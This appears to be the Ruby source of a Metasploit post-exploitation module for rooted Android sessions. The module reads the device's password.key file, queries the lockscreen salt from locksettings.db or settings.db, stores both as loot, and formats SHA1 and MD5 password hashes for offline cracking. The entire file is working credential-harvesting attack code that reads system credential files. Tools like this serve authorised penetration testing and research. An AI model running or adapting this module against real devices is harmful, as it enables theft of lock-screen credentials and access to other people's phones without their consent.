##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sqlite3'
require 'fileutils'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Android::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Android Gather Dump Password Hashes for Android Systems',
        'Description' => %q{
          Post Module to dump the password hashes for Android System. Root is required.
          To perform this operation, two things are needed.  First, a password.key file
          is required as this contains the hash but no salt.  Next, a sqlite3 database
          is needed (with supporting files) to pull the salt from.  Combined, this
          creates the hash we need.  Samsung based devices change the hash slightly.
        },
        'License' => MSF_LICENSE,
        'Author' => ['h00die', 'timwr'],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Platform' => 'android',
        'References' => [
          ['URL', 'https://www.pentestpartners.com/security-blog/cracking-android-passwords-a-how-to/'],
          ['URL', 'https://hashcat.net/forum/thread-2202.html'],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def read_store_sql(location)
    # we need the .db file, as well as the supporting files .db-shm and .db-wal as they may contain
    # the values we are looking for
    db_loot_name = ''
    file_name = File.basename(location)
    ['', '-wal', '-shm'].each do |ext|
      l = location + ext
      next unless file_exist?(l)

      f = file_name + ext
      data = read_file(l)

      if data.blank?
        print_error("Unable to read #{l}")
        next
      end

      print_good("Saved #{f} with length #{data.length}")

      if ext == ''
        db_loot_name = store_loot('SQLite3 DB', 'application/x-sqlite3', session, data, f, 'Android database')
        next
      end

      loot_file = store_loot('SQLite3 DB', 'application/binary', session, data, f, 'Android database')

      # in order for sqlite3 to see the -wal and -shm support files, we have to rename them
      # we have to do this since the ext is > 3
      # https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/report.rb#L391
      new_name = "#{db_loot_name}#{ext}"
      FileUtils.mv(loot_file, new_name)
    end

    SQLite3::Database.new(db_loot_name)
  end

  def run
    unless is_root?
      fail_with(Failure::NoAccess, 'This module requires root permissions.')
    end

    manu = cmd_exec('getprop ro.product.manufacturer')

    print_status('Attempting to determine unsalted hash.')
    key_file = '/data/system/password.key'
    unless file_exist?(key_file)
      print_error('No password.key file, no password on device.')
      return
    end

    hash = read_file(key_file)
    if hash.empty?
      print_error("Unable to read #{key_file}, and retrieve hash.")
      return
    end
    store_loot('Key', 'plain/text', session, hash, 'password.key', 'Android password hash key')
    print_good('Saved password.key')

    print_status('Attempting to determine salt')
    os = cmd_exec('getprop ro.build.version.release')
    vprint_status("OS Version: #{os}")

    locksettings_db = '/data/system/locksettings.db'
    locksettings_sql = "select value from locksettings where name='lockscreen.password_salt';"
    unless file_exist? locksettings_db
      vprint_status("Could not find #{locksettings_db}, using settings.db")
      locksettings_db = '/data/data/com.android.providers.settings/databases/settings.db'
      locksettings_sql = "select value from secure where name='lockscreen.password_salt';"
    end

    begin
      vprint_status("Attempting to load lockscreen db: #{locksettings_db}")
      db = read_store_sql(locksettings_db)
      if db.nil?
        print_error('Unable to load settings.db file.')
        return
      end
      salt = db.execute(locksettings_sql)
    rescue SQLite3::SQLException
      print_error("Failed to pull salt from database.  Command output: #{salt}")
      return
    end

    salt = salt[0][0] # pull string from results Command output: [["5381737017539487883"]] may also be negative.

    # convert from number string to hex and lowercase
    salt = salt.to_i
    salt += 2**64 if salt < 0 # deal with negatives
    salt = salt.to_s(16)
    print_good("Password Salt: #{salt}")

    sha1 = hash[0...40]
    sha1 = "#{sha1}:#{salt}"
    print_good("SHA1: #{sha1}")
    credential_data = {
      # no way to tell them apart w/o knowing one is samsung or not.
      jtr_format: manu =~ /samsung/i ? 'android-samsung-sha1' : 'android-sha1',
      origin_type: :session,
      post_reference_name: refname,
      private_type: :nonreplayable_hash,
      private_data: sha1,
      session_id: session_db_id,
      username: '',
      workspace_id: myworkspace_id
    }
    create_credential(credential_data)

    if hash.length > 40 # devices other than Samsungs have sha1+md5 combined into a single string
      md5 = hash[40...72]
      md5 = "#{md5}:#{salt}"
      print_good("MD5: #{md5}")
      credential_data = {
        jtr_format: Metasploit::Framework::Hashes.identify_hash(md5),
        origin_type: :session,
        post_reference_name: refname,
        private_type: :nonreplayable_hash,
        private_data: md5,
        session_id: session_db_id,
        username: '',
        workspace_id: myworkspace_id
      }
      create_credential(credential_data)
    end
  end
end
